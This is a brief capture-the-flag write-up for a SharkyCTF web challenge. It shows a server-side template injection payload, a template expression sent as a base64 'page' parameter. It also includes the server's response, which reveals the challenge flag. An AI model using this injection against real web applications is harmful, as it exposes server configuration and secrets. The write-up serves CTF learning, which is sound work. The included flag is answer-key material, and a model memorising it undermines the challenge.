# WebFugu

## Description

A new site listing the different species of fugu fish has appeared on the net. Used by many researchers, it is nevertheless vulnerable. Find the vulnerability and exploit it to recover some of the website configuration.

Creator: MasterFox

http://webfugu.sharkyctf.xyz


Getting the page content:
```
GET /process?page=PGRpdj4gPHRhYmxlIGJvcmRlcj0iMSI%2BIDx0cj4gPHRoPk5hbWU8L3RoPiA8dGg%2BRGlzY292ZXJ5IHllYXI8L3RoPiA8dGg%2BRGlzY292ZXJlciBuYW1lPC90aD4gPC90cj4gPHRyIHRoOmVhY2ggPSJmaXNoIDogJHtmaXNoZXN9Ij4gPHRkIHRoOnV0ZXh0PSIke2Zpc2gubmFtZX0iPi4uLjwvdGQ%2BIDx0ZCB0aDp1dGV4dD0iJHtmaXNoLmRpc2NvdmVyeVllYXJ9Ij4uLi48L3RkPiA8dGQgdGg6dXRleHQ9IiR7ZmlzaC5kaXNjb3ZlcmVyTmFtZX0iPi4uLjwvdGQ%2BIDwvdHI%2BIDwvdGFibGU%2BIDwvZGl2PiAgICAgIAo= HTTP/1.1
Host: webfugu.sharkyctf.xyz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://webfugu.sharkyctf.xyz/
Connection: close

```

## Solution

```
GET /process?page=<@urlencode_1><@base64_0><div> [[${#ctx.flag.content}]]  </div>      
<@/base64_0><@/urlencode_1> HTTP/1.1
Host: webfugu.sharkyctf.xyz

```

```
HTTP/1.1 200 
Server: nginx/1.14.2
Date: Sat, 09 May 2020 14:12:44 GMT
Content-Type: text/html;charset=UTF-8
Connection: close
Content-Length: 75

<div> shkCTF{w31rd_fishes_6ee9f7aabf6689c6684ad9fd9ffbae5a}  </div>      

```